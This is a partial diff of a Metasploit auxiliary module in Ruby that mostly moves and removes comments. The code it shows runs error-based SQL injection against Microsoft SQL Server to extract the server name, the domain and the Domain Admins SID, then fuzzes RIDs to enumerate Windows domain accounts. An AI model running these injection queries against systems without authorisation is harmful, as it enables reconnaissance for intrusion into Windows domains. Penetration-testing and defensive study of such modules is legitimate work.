@@ -39,7 +39,6 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
 
-    # Get the server name
     print_status("#{peer} - Grabbing the server and domain name...")
     db_server_name = get_server_name
     if db_server_name.nil?
@@ -49,7 +48,6 @@ class Metasploit3 < Msf::Auxiliary
       print_good("#{peer} - Server name: #{db_server_name}")
     end
 
-    # Get the domain name of the SQL Server
     db_domain_name = get_domain_name
     if db_domain_name.nil?
       print_error("#{peer} - Unable to grab domain name")
@@ -64,7 +62,6 @@ class Metasploit3 < Msf::Auxiliary
       print_good("#{peer} - Domain name: #{db_domain_name}")
     end
 
-    # Get the SID for the domain
     print_status("#{peer} - Grabbing the SID for the domain...")
     windows_domain_sid = get_windows_domain_sid(db_domain_name)
     if windows_domain_sid.nil?
@@ -121,17 +118,14 @@ class Metasploit3 < Msf::Auxiliary
     print_status("Query results have been saved to: #{path}")
   end
 
+  # Get the server name
   def get_server_name
-
-    # Setup query
     clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
     clue_end = Rex::Text.rand_text_alpha(8 + rand(4))
     sql = "(select '#{clue_start}'+@@servername+'#{clue_end}')"
 
-    # Run query
     result = mssql_query(sql)
 
-    # Parse result
     if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
       instance_name = $1
       sql_server_name = instance_name.split('\\')[0]
@@ -142,17 +136,14 @@ class Metasploit3 < Msf::Auxiliary
     sql_server_name
   end
 
+  # Get the domain name of the SQL Server
   def get_domain_name
-
-    # Setup query
     clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
     clue_end = Rex::Text.rand_text_alpha(8 + rand(4))
     sql = "(select '#{clue_start}'+DEFAULT_DOMAIN()+'#{clue_end}')"
 
-    # Run query
     result = mssql_query(sql)
 
-    # Parse result
     if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
       domain_name = $1
     else
@@ -162,27 +153,20 @@ class Metasploit3 < Msf::Auxiliary
     domain_name
   end
 
+  # Get the SID for the domain
   def get_windows_domain_sid(db_domain_name)
-
-    # Setup group
     domain_group = "#{db_domain_name}\\Domain Admins"
 
-    # Randomized start and stop flags
     clue_start = Rex::Text.rand_text_alpha(8)
     clue_end = Rex::Text.rand_text_alpha(8)
 
-    # Setup query
     sql = "(select cast('#{clue_start}'+(select stuff(upper(sys.fn_varbintohexstr((SELECT SUSER_SID('#{domain_group}')))), 1, 2, ''))+'#{clue_end}' as int))"
 
-    # Run query
     result = mssql_query(sql)
 
-    # Parse result
     if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
       object_sid = $1
       domain_sid = object_sid[0..47]
-
-      # Return if sid does not resolve for a domain
       return nil if domain_sid.empty?
     else
       domain_sid = nil
@@ -191,14 +175,11 @@ class Metasploit3 < Msf::Auxiliary
     domain_sid
   end
 
-    # Get list of windows accounts,groups,and computer accounts
+  # Get list of windows accounts, groups and computer accounts
   def get_win_domain_users(windows_domain_sid)
-
-    # Randomized start and stop flags
     clue_start = Rex::Text.rand_text_alpha(8)
     clue_end = Rex::Text.rand_text_alpha(8)
 
-    # Create array to store the windws accounts etc
     windows_logins = []
 
     # Fuzz the principal_id parameter (RID in this case) passed to the SUSER_NAME function
@@ -224,23 +205,16 @@ class Metasploit3 < Msf::Auxiliary
         return nil
       end
 
-      # Setup query
       sql = "(SELECT '#{clue_start}'+(SELECT SUSER_SNAME(#{win_sid}) as name)+'#{clue_end}')"
 
-      # Execute query
       result = mssql_query(sql)
 
-      # Parse result
       if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
         windows_login = $1
 
-        # Print account,group,or computer account etc
         if windows_login.length != 0
           print_status("#{peer} -  #{windows_login}")
-
-          # Add to windows domain object list
           windows_logins.push(windows_login) unless windows_logins.include?(windows_login)
-
           # Verbose output
           vprint_status("#{peer} - Test sid: #{win_sid}")
         end
@@ -248,7 +222,6 @@ class Metasploit3 < Msf::Auxiliary
 
     end
 
-    # Return list of windows accounts
     windows_logins
   end
 
